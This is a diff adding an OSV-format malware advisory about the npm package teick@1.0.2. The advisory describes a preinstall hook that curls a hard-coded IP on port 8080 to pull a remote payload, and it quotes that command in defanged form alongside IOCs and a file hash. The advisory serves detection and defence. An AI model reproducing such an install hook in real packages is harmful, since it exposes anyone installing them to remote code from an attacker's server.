@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13690",
+  "modified": "2026-11-05T16:35:55Z",
+  "published": "2026-11-05T16:16:08Z",
+  "summary": "Malicious code in teick (npm)",
+  "details": "teick@1.0.2 ships no code: the tarball contains only package.json (118 bytes), and its sole content of consequence is a preinstall lifecycle hook running `curl hxxps://159[.]223[.]131[.]130:8080`. Installing the package therefore causes an immediate outbound HTTPS request to a hard-coded IP address (159[.]223[.]131[.]130) on port 8080, with the actual payload delivered from that endpoint rather than from npm — the publish is a name-reservation container whose behaviour lives entirely on the remote host. There is no bundled script, decoder or second stage inside the package, so the package functions purely as an install-time trigger/callback to the operator's server. IOC: hxxps://159[.]223[.]131[.]130:8080.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "teick",
+        "purl": "pkg:npm/teick"
+      },
+      "versions": [
+        "1.0.2"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/teick/v/1.0.2"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-13690"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-05T16:16:08Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "159[.]223[.]131[.]130",
+          "159[.]223[.]131[.]130:8080"
+        ],
+        "sha256": [
+          "5eff53f7c21559df9f558740c330e569fdae35487aafbb33faab6eb0d3a4f56c"
+        ],
+        "url_observed": [
+          "hxxps://159[.]223[.]131[.]130",
+          "hxxps://159[.]223[.]131[.]130:8080"
+        ]
+      }
+    }
+  }
+}
